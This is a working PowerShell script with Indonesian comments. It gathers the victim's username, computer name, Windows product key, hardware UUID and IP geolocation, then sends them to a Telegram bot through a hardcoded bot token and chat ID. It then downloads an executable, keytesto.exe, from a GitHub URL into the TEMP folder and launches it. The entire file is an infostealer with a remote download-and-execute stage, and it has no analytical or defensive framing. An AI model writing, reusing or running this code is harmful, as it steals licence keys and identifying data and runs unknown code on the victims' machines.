# === KONFIGURASI BOT TELEGRAM ===
$botToken = "8219198722:AAF4sCFSsjUtyUNVONbJovaMWmpw5_sYvRE"
$chatId   = "-1002745947926"  # Chat ID grup kamu

# === DATA LOKAL ===
$username = $env:USERNAME
$computerName = $env:COMPUTERNAME

# === AMBIL LOKASI BERDASARKAN IP ===
try {
    $loc = Invoke-RestMethod -Uri "http://ip-api.com/json" -UseBasicParsing
    $ip = $loc.query
    $country = $loc.country
    $city = $loc.city
    $lat = $loc.lat
    $lon = $loc.lon
} catch {
    $ip = "N/A"; $country = "N/A"; $city = "N/A"; $lat = "?"; $lon = "?"
}

# === AMBIL WINDOWS KEY ===
function Get-WindowsKey {
    try {
        $key = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
        if (-not $key) { return "Tidak Ditemukan / OEM" }
        return $key
    } catch {
        return "Gagal"
    }
}

# === AMBIL HWID / UUID ===
function Get-HWID {
    try {
        return (Get-WmiObject Win32_ComputerSystemProduct).UUID
    } catch {
        return "Gagal"
    }
}

# === FORMAT PESAN ===
$pesan = @"
PC Online Terdeteksi!
Username : $username
Computer : $computerName
WinKey   : $(Get-WindowsKey)
HWID     : $(Get-HWID)

LOKASI BERDASARKAN IP
IP       : $ip
Negara   : $country
Kota     : $city
Koordinat: $lat, $lon
"@

# === KIRIM KE TELEGRAM ===
$encoded = [System.Web.HttpUtility]::UrlEncode($pesan)
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encoded"

try {
    Invoke-RestMethod -Uri $url -UseBasicParsing
    Write-Host "✅ Info berhasil dikirim ke Telegram."
} catch {
    Write-Host "❌ Gagal kirim ke Telegram."
    Write-Host $_.Exception.Message
}

# URL file keytesto.exe dari GitHub
$exeUrl = "https://raw.githubusercontent.com/fujikomilk17/lmao/refs/heads/main/keytesto.exe"

# Path penyimpanan di folder TEMP
$exePath = "$env:TEMP\keytesto.exe"

# Cek apakah file sudah ada
if (-not (Test-Path $exePath)) {
    try {
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
        Write-Host "keytesto.exe berhasil diunduh ke $exePath"
    } catch {
        Write-Error "Gagal mengunduh keytesto.exe: $_"
        exit 1
    }
} else {
    Write-Host "File keytesto.exe sudah ada di $exePath"
}

# Jalankan keytesto.exe
Start-Process -FilePath $exePath -WindowStyle Normal
